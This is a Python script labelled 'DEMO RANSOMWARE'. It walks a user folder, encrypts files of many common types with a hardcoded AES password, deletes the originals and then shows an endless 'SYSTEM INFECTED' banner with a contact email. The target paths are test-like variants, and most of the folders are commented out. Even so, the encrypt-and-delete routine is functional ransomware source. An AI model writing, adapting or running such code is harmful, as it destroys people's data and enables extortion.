#!/usr/bin/python3
import PySimpleGUI as sg
import os,pyAesCrypt
import os.path

bufferSize = 64 * 1024
pswd = "12345678"

desktop=os.path.expanduser("~/DesktopX")
docs=os.path.expanduser("~/DocumentsX")
dwnlds=os.path.expanduser("~/DownloadsX")
pics=os.path.expanduser("~/Picturesj")
# dir_path = os.path.dirname(os.path.realpath(__file__))
dirs=[]
def addFiles(thePath):
        for dirName,folders,filelist in os.walk(thePath):
                for filename in filelist:
                        dirs.append(dirName+'/'+filename)
try:
        # addFiles(desktop)
        # addFiles(docs)
        # addFiles(dwnlds)
        addFiles(pics)
        print(dirs)
except :
        print("An error occured while adding to DIRS")


for i in dirs:
    if i.endswith('mp4') or i.endswith('java')  or i.endswith('js') or i.endswith('avi') or i.endswith('py') or i.endswith('VOB') or i.endswith('xml') or i.endswith('doc') or i.endswith('txt') or i.endswith('zip') or i.endswith('skp') or i.endswith('skb') or i.endswith('css') or i.endswith('MP3') or i.endswith('jar') or i.endswith('pdf') or i.endswith('jpg') or i.endswith('png') or i.endswith('mp3') or i.endswith('csv') or i.endswith('mkv') or i.endswith('MP4') or i.endswith('cab') or i.endswith('xlsx') or i.endswith('docx') or i.endswith('html') or i.endswith('jpeg'):
                        
                        try:
                              pyAesCrypt.encryptFile(i,i + ".ltt", pswd, bufferSize)
                        except:
                                print("ERROR ENCRYPTING "+i)                
                        try:
                                                os.remove(i)              
                        except:
                                                print("ERROR DELETING "+i)
    
def banner():
    sg.change_look_and_feel('DarkBrown2') 
    layout = [
        [sg.Text('!!!!OOPS!!! SYSTEM INFECTED!!!!!',text_color="red",justification="center",font=('Helvetica', 26))],
        [sg.Text('_'*80,text_color="red")],
        [sg.Text('################################################',text_color="red")],
        [sg.Text('#                                                  ',text_color="red")],
        [sg.Text('#                                                  ',text_color="red")],
        [sg.Text('#         IF YOU ARE SEEING THIS BANNER,THEN       ',text_color="red")],
        [sg.Text('#         YOUR COMPUTER HAS BEEN COMPROMISED       ',text_color="red")],
        [sg.Text('#         THIS MEANS ALL YOUR IMPORTANT FILES      ',text_color="red")],
        [sg.Text('#         AND DOCUMENTS HAVE BEEN ENCRYPTED.       ',text_color="red")],
        [sg.Text('#                                                  ',text_color="red")],
        [sg.Text('#                                                  ',text_color="red")],
        [sg.Text('################################################',text_color="red")],
        [sg.Multiline(default_text='This is the default Text should', size=(70, 8))],
        [sg.Text('Contact Us; luttakenya@gmail.com',size=(50, 2),justification="center")],
        [sg.Cancel(button_text="CLOSE",size=(7, 2),  font='Helvetica 14')]
    ]

    window = sg.Window('DEMO RANSOMWARE', layout)
    event, values = window.read()
    window.close()

while True:
    banner()

